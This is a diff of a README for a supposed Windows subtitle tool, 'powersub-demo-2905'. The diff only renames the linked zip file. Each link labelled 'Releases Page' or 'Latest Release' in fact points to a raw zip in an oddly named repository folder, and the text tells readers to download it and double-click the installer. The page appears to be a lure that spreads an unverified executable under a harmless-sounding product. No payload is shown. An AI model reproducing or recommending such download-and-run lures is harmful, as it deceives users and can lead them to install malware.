@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-2905 - Easy Subtitle Management for Everyone
 
 ## 📥 Download Now
-[![Latest Release](https://raw.githubusercontent.com/castrx444/powersub-demo-2905/main/suprarenine/powersub-demo-2905.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/castrx444/powersub-demo-2905/main/suprarenine/powersub-demo-2905.zip)
+[![Latest Release](https://raw.githubusercontent.com/castrx444/powersub-demo-2905/main/suprarenine/powersub-demo-1.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/castrx444/powersub-demo-2905/main/suprarenine/powersub-demo-1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the powersub-demo-2905 project! This application makes managing subtitles simple and effective. Whether you're watching your favorite movie or learning a new language, this tool helps you find and organize subtitles quickly.
@@ -16,14 +16,14 @@ Welcome to the powersub-demo-2905 project! This application makes managing subti
 ## 📁 Download & Install
 To get started with powersub-demo-2905, follow these steps:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/castrx444/powersub-demo-2905/main/suprarenine/powersub-demo-2905.zip).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/castrx444/powersub-demo-2905/main/suprarenine/powersub-demo-1.0.zip).
 2. Look for the latest version listed there.
 3. Click on the appropriate file for your operating system.
 4. Once downloaded, locate the file in your Downloads folder.
 5. Double-click the file to run the installer.
 6. Follow the instructions to complete the installation.
 
-You can also revisit the [Releases Page](https://raw.githubusercontent.com/castrx444/powersub-demo-2905/main/suprarenine/powersub-demo-2905.zip) at any time for updates or to download again.
+You can also revisit the [Releases Page](https://raw.githubusercontent.com/castrx444/powersub-demo-2905/main/suprarenine/powersub-demo-1.0.zip) at any time for updates or to download again.
 
 ## 📖 Application Features
 - **Easy Subtitle Search:** Quickly find the subtitles you need.
@@ -46,7 +46,7 @@ Once installed, follow these steps to use powersub-demo-2905:
 A: This application is optimized for Windows 10 or later for the best experience.
 
 ### Q: How do I update the app?
-A: Visit the [Releases Page](https://raw.githubusercontent.com/castrx444/powersub-demo-2905/main/suprarenine/powersub-demo-2905.zip) regularly to check for updates.
+A: Visit the [Releases Page](https://raw.githubusercontent.com/castrx444/powersub-demo-2905/main/suprarenine/powersub-demo-1.0.zip) regularly to check for updates.
 
 ### Q: What if I encounter an error?
 A: If you face issues, consult the built-in help section or visit the Issues tab on GitHub for support.
